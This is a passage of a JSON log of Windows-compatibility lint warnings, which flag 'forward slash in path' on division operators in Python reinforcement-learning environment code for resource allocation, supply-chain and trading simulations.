        "warning": "Line 391: Forward slash in path - ', 0) / \n                              max(1, res_agent.metrics.get('",
        "timestamp": "2025-09-05T17:30:42.249372"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 403: Forward slash in path - ': 1.0 - sum(r.available_capacity for r in self.resources.values()) / \n                                  sum(r.total_capacity for r in self.resources.values()),\n            '",
        "timestamp": "2025-09-05T17:30:42.249393"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 416: Forward slash in path - ': len(self.pending_requests) / max(1, len(self.resource_agents))\n        }\n        \n        return EnvironmentState(\n            global_state=updated_global_state,\n            agent_states=updated_agent_states,\n            market_conditions=updated_market_conditions,\n            timestamp=datetime.now(),\n            step_count=state.step_count + 1\n        )\n    \n    def _process_agent_actions(self, agent_id: str, action_vector: np.ndarray) -> List[ResourceRequest]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.249420"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 474: Forward slash in path - \"\n        # Map [-1, 1] to priority levels\n        normalized = (priority_weight + 1) / 2  # Convert to [0, 1]\n        \n        if normalized < 0.2:\n            return PriorityLevel.LOW\n        elif normalized < 0.4:\n            return PriorityLevel.NORMAL\n        elif normalized < 0.6:\n            return PriorityLevel.HIGH\n        elif normalized < 0.8:\n            return PriorityLevel.CRITICAL\n        else:\n            return PriorityLevel.EMERGENCY\n    \n    def _allocate_resources(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.249468"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 506: Forward slash in path - \"\n        allocated_requests = []\n        \n        # Group requests by resource type\n        requests_by_type = defaultdict(list)\n        for req in self.pending_requests:\n            requests_by_type[req.resource_type].append(req)\n        \n        # Allocate each resource type separately\n        for resource_type, requests in requests_by_type.items():\n            available = self.resources[resource_type].available_capacity\n            \n            if available <= 0 or not requests:\n                continue\n            \n            # Calculate weighted demand\n            total_weighted_demand = sum(\n                req.amount * req.priority.value for req in requests\n            )\n            \n            if total_weighted_demand <= available:\n                # Enough resources for everyone\n                for req in requests:\n                    self._create_allocation(req, req.amount)\n                    allocated_requests.append(req)\n            else:\n                # Proportional allocation\n                for req in requests:\n                    weighted_demand = req.amount * req.priority.value\n                    allocation_ratio = weighted_demand / total_weighted_demand\n                    allocated_amount = min(req.amount, available * allocation_ratio)\n                    \n                    if allocated_amount > 0.1:  # Minimum allocation threshold\n                        self._create_allocation(req, allocated_amount)\n                        allocated_requests.append(req)\n        \n        # Remove allocated requests from pending\n        self.pending_requests = [req for req in self.pending_requests \n                               if req not in allocated_requests]\n    \n    def _allocate_priority_based(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.249510"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 573: Forward slash in path - \"\n        allocated_requests = []\n        \n        # Group requests by resource type\n        requests_by_type = defaultdict(list)\n        for req in self.pending_requests:\n            requests_by_type[req.resource_type].append(req)\n        \n        for resource_type, requests in requests_by_type.items():\n            available = self.resources[resource_type].available_capacity\n            \n            if available <= 0 or not requests:\n                continue\n            \n            # Calculate fair share\n            num_agents = len(set(req.requester_id for req in requests))\n            fair_share_per_agent = available / num_agents\n            \n            # Group by agent\n            requests_by_agent = defaultdict(list)\n            for req in requests:\n                requests_by_agent[req.requester_id].append(req)\n            \n            # Allocate fair share to each agent\n            for agent_id, agent_requests in requests_by_agent.items():\n                agent_share = fair_share_per_agent\n                \n                # Distribute agent'",
        "timestamp": "2025-09-05T17:30:42.249552"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 779: Forward slash in path - \"\n        if not self.resource_agents:\n            return 1.0\n        \n        # Calculate total resource value allocated to each agent\n        agent_allocations = defaultdict(float)\n        for allocation in self.active_allocations + self.allocation_history[-50:]:\n            value = allocation.amount * self.resources[allocation.resource_type].unit_cost\n            agent_allocations[allocation.agent_id] += value\n        \n        # Ensure all agents are represented\n        for agent_id in self.resource_agents.keys():\n            if agent_id not in agent_allocations:\n                agent_allocations[agent_id] = 0.0\n        \n        allocations = list(agent_allocations.values())\n        n = len(allocations)\n        \n        if n == 0:\n            return 1.0\n        \n        sum_x = sum(allocations)\n        sum_x_squared = sum(x**2 for x in allocations)\n        \n        if sum_x_squared == 0:\n            return 1.0\n        \n        fairness_index = (sum_x**2) / (n * sum_x_squared)\n        return fairness_index\n    \n    def _calculate_efficiency_index(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.249715"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 810: Forward slash in path - \"\n        if not self.resources:\n            return 0.0\n        \n        total_capacity = sum(r.total_capacity for r in self.resources.values())\n        total_used = sum(r.total_capacity - r.available_capacity \n                        for r in self.resources.values())\n        \n        if total_capacity == 0:\n            return 0.0\n        \n        return total_used / total_capacity\n    \n    def _get_agent_connections(self, agent_id: str) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.249752"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 845: Forward slash in path - \"\n        res_agent = self.resource_agents[agent_id]\n        \n        if not res_agent.allocation_history:\n            return 0.5\n        \n        # Analyze recent allocation patterns\n        recent_allocations = res_agent.allocation_history[-20:]  # Last 20 allocations\n        \n        # Score based on resource diversity (sharing different types)\n        resource_types_used = set(alloc.resource_type for alloc in recent_allocations)\n        diversity_score = len(resource_types_used) / len(self.resource_types)\n        \n        # Score based on allocation efficiency (using resources effectively)\n        if recent_allocations:\n            avg_efficiency = np.mean([alloc.efficiency for alloc in recent_allocations])\n            efficiency_score = avg_efficiency\n        else:\n            efficiency_score = 0.5\n        \n        # Score based on fairness (not hogging resources)\n        total_allocated = sum(alloc.amount for alloc in recent_allocations)\n        avg_agent_allocation = np.mean([\n            sum(alloc.amount for alloc in agent.allocation_history[-20:])\n            for agent in self.resource_agents.values()\n        ])\n        \n        if avg_agent_allocation > 0:\n            fairness_ratio = min(2.0, total_allocated / avg_agent_allocation)\n            fairness_score = 1.0 / fairness_ratio if fairness_ratio > 1.0 else 1.0\n        else:\n            fairness_score = 0.5\n        \n        # Combine scores\n        collaboration_score = (diversity_score * 0.3 + \n                             efficiency_score * 0.4 + \n                             fairness_score * 0.3)\n        \n        return collaboration_score\n    \n    def _calculate_rewards(self, actions: Dict[str, np.ndarray], state: EnvironmentState) -> Dict[str, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.249822"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 886: Forward slash in path - \"\n        rewards = {}\n        \n        for agent_id, res_agent in self.resource_agents.items():\n            # Utility-based reward from allocations\n            utility_reward = 0.0\n            for allocation in res_agent.active_allocations:\n                # Find the original request\n                utility_value = allocation.amount * allocation.efficiency\n                utility_reward += utility_value / 100.0  # Scale reward\n            \n            # Fairness reward\n            fairness_reward = 0.0\n            if self.reward_shaping:\n                fairness_index = self._calculate_fairness_index()\n                if fairness_index > 0.8:  # High fairness\n                    fairness_reward = (fairness_index - 0.8) * 0.5\n            \n            # Efficiency reward  \n            efficiency_reward = 0.0\n            if res_agent.allocation_history:\n                recent_allocations = res_agent.allocation_history[-10:]\n                avg_efficiency = np.mean([alloc.efficiency for alloc in recent_allocations])\n                efficiency_reward = (avg_efficiency - 1.0) * 0.2  # Bonus for above-average efficiency\n            \n            # Budget utilization penalty/reward\n            budget_reward = 0.0\n            utilization = res_agent.spent / res_agent.budget if res_agent.budget > 0 else 0\n            if 0.7 <= utilization <= 0.9:  # Optimal budget usage\n                budget_reward = 0.1\n            elif utilization > 0.95:  # Over-spending penalty\n                budget_reward = -0.2\n            \n            # Collaboration bonus\n            collaboration_bonus = 0.0\n            if self.reward_shaping:\n                collab_score = state.agent_states[agent_id]['",
        "timestamp": "2025-09-05T17:30:42.249878"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 983: Forward slash in path - ', 0) / \n                                       max(1, agent.metrics.get('",
        "timestamp": "2025-09-05T17:30:42.249970"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 1011: Forward slash in path - \"    Capacity: {resource.available_capacity:.1f}/{resource.total_capacity:.1f}\"",
        "timestamp": "2025-09-05T17:30:42.250040"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "warning": "Line 1017: Forward slash in path - ', 0) / max(1, \n                res_agent.metrics.get('",
        "timestamp": "2025-09-05T17:30:42.250084"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 106: Forward slash in path - ': 1.0,  # Orders fulfilled / total orders\n            '",
        "timestamp": "2025-09-05T17:30:42.250498"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 157: Forward slash in path - '] = orders_fulfilled / orders_received\n        \n        # Inventory turnover\n        if inventory_values:\n            avg_inventory_value = sum(inventory_values.values()) / len(inventory_values)\n            if avg_inventory_value > 0:\n                self.metrics['",
        "timestamp": "2025-09-05T17:30:42.250535"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 163: Forward slash in path - '] = sales / avg_inventory_value\n        \n        # Cost efficiency\n        if self.revenue > 0:\n            self.metrics['",
        "timestamp": "2025-09-05T17:30:42.250543"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 167: Forward slash in path - '] = (self.revenue - self.costs) / self.revenue\n        \n        # Service level (simplified - could be more complex)\n        self.metrics['",
        "timestamp": "2025-09-05T17:30:42.250552"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 329: Forward slash in path - ': min(1.0, inventory_value / (sum(sc_agent.capacity.values()) * 10.0)),\n                '",
        "timestamp": "2025-09-05T17:30:42.250670"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 332: Forward slash in path - ': len(sc_agent.suppliers + sc_agent.customers) / len(self.agent_configs),\n                '",
        "timestamp": "2025-09-05T17:30:42.250686"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 406: Forward slash in path - ': min(1.0, inventory_value / (sum(sc_agent.capacity.values()) * 10.0)),\n                '",
        "timestamp": "2025-09-05T17:30:42.250749"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 432: Forward slash in path - \"\n        sc_agent = self.supply_chain_agents[agent_id]\n        \n        num_products = len(self.products)\n        max_suppliers = 3\n        \n        # Decode action vector\n        order_actions = action_vector[:num_products * max_suppliers]\n        pricing_actions = action_vector[num_products * max_suppliers:num_products * max_suppliers + num_products]\n        inventory_actions = action_vector[num_products * max_suppliers + num_products:]\n        \n        # Process ordering actions\n        for i, product in enumerate(self.products):\n            for j, supplier_id in enumerate(sc_agent.suppliers[:max_suppliers]):\n                action_idx = i * max_suppliers + j\n                if action_idx < len(order_actions):\n                    order_quantity = max(0, order_actions[action_idx] * 100)  # Scale to reasonable quantity\n                    \n                    if order_quantity > 10:  # Minimum order threshold\n                        self._create_order(supplier_id, agent_id, product.id, order_quantity)\n        \n        # Process inventory management (simplified)\n        for i, product in enumerate(self.products):\n            if i < len(inventory_actions) and product.id in sc_agent.inventory:\n                target_level = max(0, inventory_actions[i] * sc_agent.capacity.get(product.id, 100))\n                current_level = sc_agent.inventory[product.id].quantity\n                \n                # Adjust production/ordering based on target (simplified logic)\n                if target_level > current_level * 1.2:\n                    # Need more inventory - increase ordering in next cycle\n                    pass\n    \n    def _create_order(self, from_node: str, to_node: str, product_id: str, quantity: float):\n        \"",
        "timestamp": "2025-09-05T17:30:42.250793"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 535: Forward slash in path - \"\n        # Seasonal effects\n        if self.seasonality_enabled:\n            day_of_year = datetime.now().timetuple().tm_yday\n            seasonal_factor = 1.0 + 0.2 * np.sin(2 * np.pi * day_of_year / 365.0)\n            self.base_demand_multiplier = seasonal_factor\n        \n        # Random demand fluctuations\n        demand_shock = random.uniform(0.9, 1.1)\n        self.base_demand_multiplier *= demand_shock\n        \n        # Event-based demand changes\n        for event in self.active_events:\n            if event.event_type == EventType.DEMAND_SPIKE:\n                self.base_demand_multiplier *= (1.0 + event.impact_magnitude)\n    \n    def _process_disruptions(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.250857"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 568: Forward slash in path - \"\n        event_types = list(EventType)\n        event_type = random.choice(event_types)\n        \n        # Select affected nodes and products\n        affected_nodes = random.sample(list(self.supply_chain_agents.keys()), \n                                     random.randint(1, max(1, len(self.supply_chain_agents) // 2)))\n        affected_products = random.sample([p.id for p in self.products], \n                                        random.randint(1, len(self.products)))\n        \n        return SupplyChainEvent(\n            event_type=event_type,\n            affected_nodes=affected_nodes,\n            affected_products=affected_products,\n            impact_magnitude=random.uniform(0.1, 0.5),\n            duration_steps=random.randint(5, 20),\n            start_step=self.step_count\n        )\n    \n    def _apply_disruption_effects(self, event: SupplyChainEvent):\n        \"",
        "timestamp": "2025-09-05T17:30:42.250894"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 631: Forward slash in path - \"])\n        fulfillment_rate = fulfilled_orders / total_orders if total_orders > 0 else 1.0\n        \n        # Disruption impact\n        disruption_impact = max(0, 1.0 - len(self.active_events) * 0.1)\n        \n        return (avg_service_level * 0.4 + fulfillment_rate * 0.4 + disruption_impact * 0.2)\n    \n    def _calculate_collaboration_score(self, agent_id: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.250947"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 640: Forward slash in path - \"\n        sc_agent = self.supply_chain_agents[agent_id]\n        \n        # Base score from network connections\n        max_connections = len(self.agent_configs) - 1\n        connection_score = len(sc_agent.suppliers + sc_agent.customers) / max_connections if max_connections > 0 else 0\n        \n        # Collaboration quality (simplified)\n        recent_orders = [o for o in self.completed_orders[-20:] \n                        if o.from_node == agent_id or o.to_node == agent_id]\n        \n        if recent_orders:\n            on_time_deliveries = len([o for o in recent_orders \n                                    if o.status == \"",
        "timestamp": "2025-09-05T17:30:42.250972"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 653: Forward slash in path - \" and o.from_node == agent_id])\n            collaboration_quality = on_time_deliveries / len([o for o in recent_orders if o.from_node == agent_id])\n        else:\n            collaboration_quality = 0.5\n        \n        return (connection_score * 0.3 + collaboration_quality * 0.7)\n    \n    def _calculate_rewards(self, actions: Dict[str, np.ndarray], state: EnvironmentState) -> Dict[str, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.250995"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 661: Forward slash in path - \"\n        rewards = {}\n        \n        for agent_id, sc_agent in self.supply_chain_agents.items():\n            # Profit-based reward\n            profit = sc_agent.revenue - sc_agent.costs\n            profit_reward = profit / 1000.0  # Scale reward\n            \n            # Service level reward\n            service_reward = (sc_agent.metrics['",
        "timestamp": "2025-09-05T17:30:42.251018"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 670: Forward slash in path - '] - 0.5) * 2.0\n            \n            # Inventory efficiency reward\n            total_capacity = sum(sc_agent.capacity.values())\n            total_inventory = sum(inv.quantity for inv in sc_agent.inventory.values())\n            utilization = total_inventory / total_capacity if total_capacity > 0 else 0\n            \n            # Optimal utilization around 70-80%\n            if 0.7 <= utilization <= 0.8:\n                efficiency_reward = 1.0\n            elif utilization < 0.7:\n                efficiency_reward = utilization / 0.7\n            else:\n                efficiency_reward = max(0, 1.0 - (utilization - 0.8) * 2)\n            \n            # Collaboration reward\n            collaboration_reward = 0.0\n            if self.reward_shaping:\n                collab_score = state.agent_states[agent_id]['",
        "timestamp": "2025-09-05T17:30:42.251044"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "warning": "Line 721: Forward slash in path - \"]) / \n                               len(self.completed_orders) if self.completed_orders else 0,\n            '",
        "timestamp": "2025-09-05T17:30:42.251082"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 114: Forward slash in path - '] / self.config.initial_balance for trade in self.trade_history]\n            \n            if returns:\n                self.metrics['",
        "timestamp": "2025-09-05T17:30:42.251505"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 119: Forward slash in path - '] = np.mean(returns) / self.metrics['",
        "timestamp": "2025-09-05T17:30:42.251517"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 122: Forward slash in path - ', self.config.initial_balance) \n                         for trade in self.trade_history] + [current_portfolio_value])\n        drawdown = (peak_value - current_portfolio_value) / peak_value\n        self.metrics['",
        "timestamp": "2025-09-05T17:30:42.251527"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 224: Forward slash in path - ': len(trading_agent.positions) / len(self.symbols),  # Position utilization\n                '",
        "timestamp": "2025-09-05T17:30:42.251588"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 275: Forward slash in path - '] > 0) / len(recent_trades) if recent_trades else 0.5\n            \n            updated_agent_states[agent_id] = {\n                '",
        "timestamp": "2025-09-05T17:30:42.251625"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 284: Forward slash in path - ': len(trading_agent.positions) / len(self.symbols),\n                '",
        "timestamp": "2025-09-05T17:30:42.251640"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 407: Forward slash in path - '] += 1\n            else:\n                # Update position\n                existing_position.quantity = new_quantity\n                # Weighted average entry price\n                total_value = (existing_position.quantity * existing_position.entry_price + \n                             order.quantity * current_price)\n                existing_position.entry_price = total_value / new_quantity\n        else:\n            # Create new position\n            if order.quantity != 0:\n                trading_agent.positions[symbol] = Position(\n                    symbol=symbol,\n                    quantity=order.quantity,\n                    entry_price=current_price,\n                    entry_time=datetime.now()\n                )\n        \n        # Update agent balance\n        trading_agent.balance -= transaction_cost\n        \n        # Record executed trade for market impact\n        self.executed_trades.append({\n            '",
        "timestamp": "2025-09-05T17:30:42.251731"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 438: Forward slash in path - \"\n        # Market microstructure effects\n        market_impact = self._calculate_market_impact()\n        \n        for symbol in self.symbols:\n            current_price = self.current_prices[symbol]\n            \n            # Base price movement with regime characteristics\n            random_shock = np.random.normal(0, self.volatility / np.sqrt(252))  # Daily volatility\n            trend_component = self.trend / 252  # Daily trend\n            \n            # Apply market impact\n            impact = market_impact.get(symbol, 0.0)\n            \n            # Calculate new price\n            price_change = trend_component + random_shock + impact\n            new_price = current_price * (1 + price_change)\n            \n            # Prevent negative prices\n            new_price = max(new_price, current_price * 0.1)\n            \n            self.current_prices[symbol] = new_price\n            self.price_history[symbol].append(new_price)\n            \n            # Keep limited history\n            if len(self.price_history[symbol]) > 100:\n                self.price_history[symbol] = self.price_history[symbol][-100:]\n        \n        # Update market regime occasionally\n        if random.random() < 0.01:  # 1% chance per step\n            self._potentially_change_regime()\n    \n    def _calculate_market_impact(self) -> Dict[str, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.251765"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 480: Forward slash in path - ']\n            \n            # Simple market impact model\n            relative_size = abs(quantity) / 1000.0  # Normalize by typical trade size\n            impact_magnitude = relative_size * self.market_impact_factor\n            \n            # Positive quantity (buy) increases price, negative (sell) decreases price\n            impact[symbol] += np.sign(quantity) * impact_magnitude\n        \n        return impact\n    \n    def _potentially_change_regime(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.251791"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 506: Forward slash in path - ']).total_seconds() < 300])\n        return min(1.0, recent_volume / 50.0 + 0.1)  # Base liquidity of 10%\n    \n    def _calculate_market_sentiment(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.251818"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 510: Forward slash in path - \"\n        sentiment = 0.0\n        for symbol in self.symbols:\n            if len(self.price_history[symbol]) >= 2:\n                price_change = (self.price_history[symbol][-1] - self.price_history[symbol][-2]) / self.price_history[symbol][-2]\n                sentiment += price_change\n        \n        return np.tanh(sentiment / len(self.symbols))  # Normalize to [-1, 1]\n    \n    def _calculate_collaboration_score(self, agent_id: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.251837"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 531: Forward slash in path - ']) for trade in recent_trades])\n        collaboration_score = max(0.0, 1.0 - (avg_trade_size / 1000.0))\n        return collaboration_score\n    \n    def _get_agent_connections(self, agent_id: str) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.251861"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 550: Forward slash in path - \"\n        rewards = {}\n        \n        for agent_id, trading_agent in self.trading_agents.items():\n            # Base reward: Portfolio return\n            portfolio_value = trading_agent.calculate_portfolio_value(self.current_prices)\n            portfolio_return = (portfolio_value - self.agent_configs[agent_id].initial_balance) / self.agent_configs[agent_id].initial_balance\n            base_reward = portfolio_return * 10.0  # Scale reward\n            \n            # Risk-adjusted reward (Sharpe ratio component)\n            risk_adjustment = 0.0\n            if len(trading_agent.trade_history) > 5:\n                returns = [trade['",
        "timestamp": "2025-09-05T17:30:42.251892"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 562: Forward slash in path - '] / self.agent_configs[agent_id].initial_balance \n                          for trade in trading_agent.trade_history[-10:]]\n                if returns and np.std(returns) > 0:\n                    sharpe_like = np.mean(returns) / np.std(returns)\n                    risk_adjustment = sharpe_like * 0.5\n            \n            # Collaboration bonus\n            collaboration_bonus = 0.0\n            if self.reward_shaping:\n                collaboration_score = state.agent_states[agent_id]['",
        "timestamp": "2025-09-05T17:30:42.251913"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 571: Forward slash in path - ']\n                collaboration_bonus = (collaboration_score - 0.5) * 0.1\n            \n            # Diversity bonus (trading different instruments)\n            diversity_bonus = 0.0\n            if len(trading_agent.positions) > 1:\n                diversity_bonus = min(0.1, len(trading_agent.positions) / len(self.symbols) * 0.2)\n            \n            # Transaction cost penalty\n            recent_trades_count = len([trade for trade in self.executed_trades \n                                     if trade['",
        "timestamp": "2025-09-05T17:30:42.251934"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 592: Forward slash in path - ']) for trade in agent_recent_trades])\n                    market_impact_penalty = (avg_trade_impact / 1000.0) * 0.05\n            \n            # Combine all reward components\n            total_reward = (base_reward + \n                          risk_adjustment + \n                          collaboration_bonus + \n                          diversity_bonus - \n                          transaction_penalty - \n                          market_impact_penalty)\n            \n            rewards[agent_id] = total_reward\n        \n        return rewards\n    \n    def get_market_data(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.251967"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 621: Forward slash in path - ': ((price_series[-1] - price_series[-2]) / price_series[-2]) * 100 if len(price_series) >= 2 else 0.0,\n                '",
        "timestamp": "2025-09-05T17:30:42.251994"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 634: Forward slash in path - \"\n        if len(prices) < period + 1:\n            return 50.0\n        \n        deltas = np.diff(prices)\n        gains = np.where(deltas > 0, deltas, 0)\n        losses = np.where(deltas < 0, -deltas, 0)\n        \n        avg_gain = np.mean(gains[-period:])\n        avg_loss = np.mean(losses[-period:])\n        \n        if avg_loss == 0:\n            return 100.0\n        \n        rs = avg_gain / avg_loss\n        rsi = 100 - (100 / (1 + rs))\n        \n        return rsi\n    \n    def _calculate_macd(self, prices: np.ndarray, fast: int = 12, slow: int = 26, signal_period: int = 9) -> Tuple[float, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.252023"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 679: Forward slash in path - \"\n        if len(prices) == 0:\n            return 0.0\n        \n        if len(prices) < period:\n            return np.mean(prices)\n        \n        alpha = 2.0 / (period + 1)\n        ema = prices[0]\n        \n        for price in prices[1:]:\n            ema = alpha * price + (1 - alpha) * ema\n        \n        return ema\n    \n    def _calculate_bollinger_bands(self, prices: np.ndarray, period: int = 20, std_dev: float = 2.0) -> Tuple[float, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.252058"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
